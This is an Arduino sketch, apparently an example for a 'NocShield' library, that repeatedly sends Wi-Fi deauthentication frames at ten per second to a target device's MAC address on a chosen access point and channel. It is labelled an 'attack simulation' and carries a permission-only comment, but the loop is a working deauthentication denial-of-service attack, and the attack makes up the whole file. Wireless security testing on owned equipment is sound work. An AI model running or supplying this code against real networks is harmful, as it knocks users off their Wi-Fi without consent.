#include <Arduino.h>
#include "NocShield.h"

NocShield nocShield;

// Target MAC Address (Replace with the MAC of the device you want to test)
// Note: ONLY USE ON NETWORKS AND DEVICES YOU OWN/HAVE PERMISSION TO TEST!
uint8_t targetMac[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};

// AP MAC Address (Replace with your Router's MAC Address)
uint8_t apMac[6] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66};

// Target AP Channel
uint8_t targetChannel = 6;

void setup() {
    Serial.begin(115200);
    delay(2000);
    Serial.println("\n--- NocShield Deauth Attack Simulation ---");
    
    // Initialize NocShield
    nocShield.begin();
    
    Serial.println("Initialization complete. Starting attack simulation in 5 seconds...");
    delay(5000);
}

void loop() {
    Serial.println("Sending Deauth Frame...");
    
    // Send a deauth frame (Reason 1: Unspecified reason)
    bool success = nocShield.sendDeauth(targetMac, apMac, targetChannel, 1);
    
    if (success) {
        Serial.println("Deauth frame sent successfully.");
    } else {
        Serial.println("Failed to send deauth frame.");
    }
    
    // Send 10 packets per second
    delay(100);
}
